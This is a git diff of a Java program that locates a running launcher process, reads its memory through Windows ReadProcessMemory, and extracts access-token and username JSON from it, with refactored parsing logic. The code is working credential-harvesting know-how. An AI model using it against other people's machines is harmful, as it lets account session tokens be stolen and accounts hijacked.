@@ -5,14 +5,12 @@ import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMAT
 import jdk.incubator.foreign.*;
 
 import java.nio.charset.StandardCharsets;
-import java.util.Comparator;
-import java.util.Optional;
+import java.util.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class Main {
-    private static final int CHUNK_SIZE = 32;
-    private static final int JSON_BUFFER_SIZE = 512;
+    private static final int CHUNK_SIZE = 512;
 
     public static void main(String[] args) {
         System.out.println("Porog a fornettigyar");
@@ -23,7 +21,7 @@ public class Main {
             .min(Comparator.comparingDouble(proc -> proc.info().startInstant().get().getEpochSecond()));
 
         if (process.isEmpty()) {
-            System.out.println("[!] The launcher has not started.");
+            System.out.println("[!] The launcher is not running.");
             return;
         }
 
@@ -35,6 +33,26 @@ public class Main {
             }
         });
         executor.shutdown();
+    }
+
+    public static String makeReadable(byte[] buffer) {
+        StringBuilder plus = new StringBuilder();
+        StringBuilder s = new StringBuilder();
+        for (byte a : buffer) {
+            if (a < 5) {
+                plus = new StringBuilder();
+            } else {
+                if (plus.length() < 5) {
+                    plus.append((char) a);
+                    if (plus.length() == 5) {
+                        s.append(plus);
+                    }
+                } else {
+                    s.append((char) a);
+                }
+            }
+        }
+        return s.toString();
     }
 
     public static String tryFindAccessToken(long pid) {
@@ -61,25 +79,34 @@ public class Main {
                             if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                 String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
 
+                                boolean runOld;
+                                int offset;
+                                int endIdx;
+                                if ((offset = bufferString.indexOf("{\"access")) > -1) {
+                                    runOld = true;
+                                    endIdx = bufferString.substring(offset).indexOf("}");
+                                } else if ((offset = bufferString.indexOf("{\"username\"")) > -1 && !bufferString.contains(":{\"username\"")) {
+                                    runOld = false;
+                                    endIdx = bufferString.substring(offset).indexOf(",\"s");
+                                } else {
+                                    continue;
+                                }
 
-                                if (bufferString.contains("{\"access") || (bufferString.contains("{\"username\"") && !bufferString.contains(":{\"username\""))) {
-                                    buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, JSON_BUFFER_SIZE);
+                                if (endIdx > 0) {
+                                    bufferString = makeReadable(buffer.asSlice(offset, endIdx).toByteArray());
+                                    return bufferString + (runOld ? "}}" : "}");
+                                }
 
-                                    if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, JSON_BUFFER_SIZE, MemoryAddress.NULL) != 0) {
-                                        bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);
+                                buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE);
+                                if (Kernel32.ReadProcessMemory(handle, readPointer.addOffset(offset), buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
+                                    bufferString = makeReadable(buffer.toByteArray());
+                                    endIdx = runOld ? bufferString.indexOf("}") : bufferString.indexOf(",\"s");
 
-                                        int endIdx = bufferString.contains("{\"access") ? bufferString.indexOf("}") : bufferString.indexOf(",\"s")-2;//63ebbf3f2126d6.35073325
-                                        int startIdx = bufferString.indexOf("{");
-                                        if (endIdx <= -1) continue;
-                                        StringBuilder result = new StringBuilder(bufferString.substring(startIdx, endIdx+2));
-
-                                        if (bufferString.contains("{\"username\"")){
-                                            result = result.delete(result.indexOf("uui")+3, result.indexOf("\0d")+1);
-                                            result = result.delete(result.indexOf("0\0")-1, result.lastIndexOf("\0")+1).append("}");
-                                        }
-
-                                        return result.toString();
+                                    if (endIdx == -1) {
+                                        continue;
                                     }
+
+                                    return bufferString.substring(0, endIdx) + (runOld ? "}}" : "}");
                                 }
                             }
                         }
